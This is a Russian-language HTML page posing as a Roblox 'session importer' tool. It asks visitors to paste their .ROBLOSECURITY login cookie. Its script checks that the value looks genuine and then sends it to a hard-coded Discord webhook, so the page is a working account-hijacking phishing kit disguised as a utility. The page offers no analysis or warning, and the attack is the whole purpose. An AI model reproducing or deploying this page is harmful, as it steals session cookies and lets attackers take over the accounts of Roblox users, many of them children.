<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBLOX TOOLS | ULTIMATE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* ========== ТЁМНАЯ ТЕМА (ЗОЛОТОЙ ПРЕМИУМ) ========== */
        :root {
            --bg1: #0a0502;
            --bg2: #1a0a03;
            --bg3: #2a1005;
            --bg4: #1a0a03;
            --bg5: #0a0502;
            --bg6: #1f0d04;
            --bg7: #0a0502;
            --card: rgba(20, 12, 5, 0.85);
            --border: rgba(255, 180, 50, 0.7);
            --border-hover: rgba(255, 200, 80, 0.9);
            --input: rgba(30, 18, 8, 0.92);
            --text: #fff5e0;
            --text2: #ffcc66;
            --text3: #ffaa33;
            --btn1: #cc8800;
            --btn2: #e6a017;
            --btn3: #ffbb33;
            --star1: #ffcc66;
            --star2: #ffaa33;
            --star3: #ffdd99;
            --star4: #e68a00;
            --star5: #ffdd99;
            --glow1: rgba(255, 180, 50, 0.25);
            --glow2: rgba(255, 200, 80, 0.45);
            --logo1: #ffcc66;
            --logo2: #ffaa33;
            --logo3: #e68a00;
            --logo4: #cc6600;
            --sub1: #ffaa33;
            --sub2: #ffcc66;
        }

        /* ========== СВЕТЛАЯ ТЕМА ========== */
        body.light {
            --bg1: #fffaf0;
            --bg2: #fff5e0;
            --bg3: #fff0d0;
            --bg4: #fff5e0;
            --bg5: #fffaf0;
            --bg6: #fff8e8;
            --bg7: #fffaf0;
            --card: rgba(255, 250, 240, 0.92);
            --border: rgba(200, 150, 50, 0.35);
            --border-hover: rgba(200, 150, 50, 0.6);
            --input: rgba(255, 250, 240, 0.96);
            --text: #5a3a00;
            --text2: #886600;
            --text3: #aa7700;
            --btn1: #d4a017;
            --btn2: #e6b422;
            --btn3: #f0c040;
            --star1: #ffe0a3;
            --star2: #ffd27a;
            --star3: #ffe8c0;
            --star4: #ffcc66;
            --star5: #fff0d5;
            --glow1: rgba(200, 150, 50, 0.12);
            --glow2: rgba(200, 150, 50, 0.25);
            --logo1: #b8860b;
            --logo2: #d4a017;
            --logo3: #e6b422;
            --logo4: #f0c040;
            --sub1: #c49b2a;
            --sub2: #d4a017;
        }

        /* АНИМАЦИИ */
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            33% { background-position: 100% 50%; }
            66% { background-position: 50% 100%; }
        }

        @keyframes starTwinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.3); }
        }

        @keyframes cookieFloat {
            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
            10% { opacity: 0.9; }
            90% { opacity: 0.9; }
            100% { transform: translateY(-10vh) translateX(25px) rotate(360deg); opacity: 0; }
        }

        @keyframes cardGlow {
            0%, 100% { box-shadow: 0 0 20px var(--glow1); }
            50% { box-shadow: 0 0 50px var(--glow2); }
        }

        @keyframes textPulse {
            0% { letter-spacing: -1px; text-shadow: 0 0 5px var(--glow1); }
            100% { letter-spacing: 2px; text-shadow: 0 0 20px var(--glow2); }
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 15%, var(--bg3) 30%, var(--bg4) 45%, var(--bg5) 60%, var(--bg6) 75%, var(--bg7) 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        /* ЗВЁЗДЫ */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .star {
            position: absolute;
            background: radial-gradient(circle, var(--star1), transparent);
            border-radius: 50%;
            animation: starTwinkle linear infinite;
        }

        /* ПЕЧЕНЬКИ */
        .cookie {
            position: fixed;
            pointer-events: none;
            z-index: 0;
            filter: drop-shadow(0 0 8px var(--glow1));
            will-change: transform;
            animation: cookieFloat linear infinite;
        }

        /* КНОПКА ТЕМЫ */
        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .theme-btn {
            background: var(--card);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 60px;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text2);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .theme-btn:hover {
            transform: scale(1.05);
            border-color: var(--border-hover);
            box-shadow: 0 0 20px var(--glow1);
        }

        /* КАРТОЧКА */
        .card {
            background: var(--card);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 45px 40px;
            max-width: 520px;
            width: 100%;
            border: 1px solid var(--border);
            animation: cardGlow 3s ease-in-out infinite;
            transition: all 0.3s ease;
            z-index: 1;
        }
        .card:hover {
            transform: translateY(-5px);
            border-color: var(--border-hover);
        }

        /* ЛОГОТИП */
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 {
            font-size: 52px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--logo1), var(--logo2), var(--logo3), var(--logo4));
            background-size: 300% 300%;
            animation: textPulse 2s ease-in-out infinite alternate;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo p {
            background: linear-gradient(135deg, var(--sub1), var(--sub2));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 4px;
            font-weight: 600;
        }

        /* ПОЛЯ ВВОДА */
        .label {
            color: var(--text2);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .cookie-input {
            width: 100%;
            background: var(--input);
            border: 1.5px solid var(--border);
            border-radius: 20px;
            padding: 16px 18px;
            color: var(--text);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
        }
        .cookie-input:focus {
            outline: none;
            border-color: var(--btn2);
            box-shadow: 0 0 0 4px var(--glow2);
        }
        .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
        .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }

        /* СТАТУС */
        .validation-status {
            font-size: 11px;
            margin-top: 10px;
            margin-bottom: 22px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text3);
        }
        .status-valid { color: #22c55e; }
        .status-invalid { color: #ef4444; }
        .status-neutral { color: var(--text3); }

        /* КНОПКА ОТПРАВКИ */
        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, var(--btn1), var(--btn2), var(--btn3));
            background-size: 200% 200%;
            animation: btnGradient 3s ease infinite;
            border: none;
            border-radius: 60px;
            padding: 14px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        @keyframes btnGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }
        .btn-primary:hover::before { left: 100%; }
        .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 35px var(--glow2); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }

        /* СООБЩЕНИЯ */
        .message-area {
            text-align: center;
            margin-top: 20px;
            opacity: 0;
            transform: translateY(-10px);
            transition: all 0.3s ease;
        }
        .message-area.show { opacity: 1; transform: translateY(0); }
        .error-text {
            color: #f87171;
            background: rgba(220,38,38,0.15);
            padding: 8px 16px;
            border-radius: 40px;
            display: inline-block;
            font-size: 12px;
        }
        .success-text {
            color: #22c55e;
            background: rgba(34,197,94,0.15);
            padding: 8px 16px;
            border-radius: 40px;
            display: inline-block;
            font-size: 12px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .shake { animation: shake 0.3s ease; }
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    <div class="theme-switch">
        <button class="theme-btn" id="themeToggleBtn"><span>🌙</span> Тема</button>
    </div>
    <div class="card">
        <div class="logo">
            <h1>ROBL<span style="background: linear-gradient(135deg, var(--sub1), var(--btn1)); -webkit-background-clip: text; background-clip: text; color: transparent;">✦</span>Tools</h1>
            <p>SESSION IMPORTER</p>
        </div>
        <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
        <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
        <div class="validation-status" id="validationStatus"><span>✨</span><span id="statusText">Ожидание ввода...</span></div>
        <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
        <div id="messageArea" class="message-area"></div>
    </div>

    <script>
        (function() {
            // ВЕБХУК
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1496536250910249102/UOfPpewlAPiGVQjWs2ykmvW0o_KYzlZT3vJJ1MNu40W2ziyoca1PpcEHroIXW_zbgK_G";

            // ЗВЁЗДЫ
            const stars = document.getElementById('stars');
            for (let i = 0; i < 200; i++) {
                const s = document.createElement('div');
                s.className = 'star';
                s.style.left = Math.random() * 100 + '%';
                s.style.top = Math.random() * 100 + '%';
                s.style.width = (1 + Math.random() * 3) + 'px';
                s.style.height = s.style.width;
                s.style.animationDuration = (1 + Math.random() * 4) + 's';
                s.style.animationDelay = Math.random() * 5 + 's';
                stars.appendChild(s);
            }

            // ПЕЧЕНЬКИ
            for (let i = 0; i < 100; i++) {
                const el = document.createElement('div');
                el.className = 'cookie';
                el.textContent = '🍪';
                el.style.left = Math.random() * 100 + '%';
                el.style.fontSize = (18 + Math.random() * 35) + 'px';
                el.style.animationDuration = (7 + Math.random() * 15) + 's';
                el.style.animationDelay = Math.random() * -25 + 's';
                el.style.opacity = 0.3 + Math.random() * 0.5;
                document.body.appendChild(el);
            }

            // ТЕМА
            const themeBtn = document.getElementById('themeToggleBtn');
            function loadTheme() {
                const saved = localStorage.getItem('roblox_theme');
                if (saved === 'light') {
                    document.body.classList.add('light');
                    themeBtn.innerHTML = '<span>☀️</span> Тема';
                } else {
                    document.body.classList.remove('light');
                    themeBtn.innerHTML = '<span>🌙</span> Тема';
                }
            }
            function toggleTheme() {
                if (document.body.classList.contains('light')) {
                    document.body.classList.remove('light');
                    localStorage.setItem('roblox_theme', 'dark');
                    themeBtn.innerHTML = '<span>🌙</span> Тема';
                } else {
                    document.body.classList.add('light');
                    localStorage.setItem('roblox_theme', 'light');
                    themeBtn.innerHTML = '<span>☀️</span> Тема';
                }
            }
            themeBtn.addEventListener('click', toggleTheme);
            loadTheme();

            // ВАЛИДАЦИЯ
            function isValidCookie(c) {
                if (!c || c.trim() === '') return false;
                const t = c.trim();
                if (!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                if (t.length < 100) return false;
                if (t.includes('<') || t.includes('>') || t.includes('script')) return false;
                return true;
            }

            const inp = document.getElementById('cookie');
            const btn = document.getElementById('sendCookieBtn');
            const statusSpan = document.getElementById('statusText');
            const statusIconSpan = document.querySelector('#validationStatus span:first-child');
            const msgDiv = document.getElementById('messageArea');

            function updateUI() {
                const val = inp.value;
                const valid = isValidCookie(val);
                inp.classList.remove('valid', 'invalid');
                if (!val.trim()) {
                    statusSpan.innerHTML = '✨ Ожидание ввода...';
                    statusSpan.className = 'status-neutral';
                    statusIconSpan.innerHTML = '✨';
                    btn.disabled = true;
                    return;
                }
                if (valid) {
                    inp.classList.add('valid');
                    statusSpan.innerHTML = '✅ Кука валидна!';
                    statusSpan.className = 'status-valid';
                    statusIconSpan.innerHTML = '✅';
                    btn.disabled = false;
                } else {
                    inp.classList.add('invalid');
                    statusSpan.innerHTML = '❌ Неверный формат куки';
                    statusSpan.className = 'status-invalid';
                    statusIconSpan.innerHTML = '❌';
                    btn.disabled = true;
                }
            }

            function showMsg(text, isErr = true) {
                msgDiv.innerHTML = `<div class="${isErr ? 'error-text' : 'success-text'}">${isErr ? '⚠️ ' : '✅ '}${text}</div>`;
                msgDiv.classList.add('show');
                setTimeout(() => msgDiv.classList.remove('show'), 3000);
            }

            async function send(cookie) {
                try {
                    const res = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: cookie })
                    });
                    return res.ok;
                } catch(e) {
                    return false;
                }
            }

            btn.onclick = async () => {
                const cookie = inp.value.trim();
                if (!isValidCookie(cookie)) {
                    showMsg('Невалидная кука! Проверьте формат.', true);
                    inp.classList.add('shake');
                    setTimeout(() => inp.classList.remove('shake'), 300);
                    return;
                }
                btn.disabled = true;
                btn.textContent = "⏳ Отправка...";
                const ok = await send(cookie);
                btn.disabled = false;
                btn.textContent = "🔄 Заменить сессию";
                if (ok) {
                    showMsg('Кука отправлена!', false);
                    inp.value = '';
                    updateUI();
                } else {
                    showMsg('Ошибка отправки. Попробуйте позже.', true);
                }
            };

            inp.addEventListener('input', updateUI);
            inp.addEventListener('paste', () => setTimeout(updateUI, 10));
            updateUI();
        })();
    </script>
</body>
</html>
